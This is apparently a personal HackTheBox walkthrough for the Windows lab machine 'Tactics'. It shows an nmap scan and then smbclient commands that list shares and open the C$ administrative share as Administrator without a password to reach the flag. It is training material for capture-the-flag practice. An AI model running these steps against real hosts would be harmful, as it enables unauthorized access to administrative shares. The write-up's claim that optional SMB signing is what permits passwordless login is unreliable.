---
title: Tactics - A HackTheBox machine
author: amandaguglieri
TableOfContents: true
draft: false
tags:
  - walkthrough
  - windows
  - smb
  - port 445
---

# Tactics - A HackTheBox machine


```bash
nmap -sC -A 10.129.228.98  -Pn -p-
```

Results:

```
PORT    STATE SERVICE       VERSION
135/tcp open  msrpc         Microsoft Windows RPC
139/tcp open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp open  microsoft-ds?
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -5s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 7476/tcp): CLEAN (Timeout)
|   Check 2 (port 63095/tcp): CLEAN (Timeout)
|   Check 3 (port 16465/udp): CLEAN (Timeout)
|   Check 4 (port 43695/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2023-05-02T10:26:04
|_  start_date: N/A

```

Interesting part here is 

```
smb2-security-mode: 
|   311: 
|_    Message signing enabled but not required

```

This will allow us to use smbclient share enumeration withouth the need of providing a password when signing into the shared folder. For that we will use a well known user in Windows: Administrator.

```bash
smbclient -L 10.129.228.98 -U Administrator
```

Results:

```
        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC

```

```bash
smbclient \\\\10.129.228.98\\C$ -U Administrator
```


Flag is located at: 

```
\Users\Administrator\Desktop\>flag.txt 
```

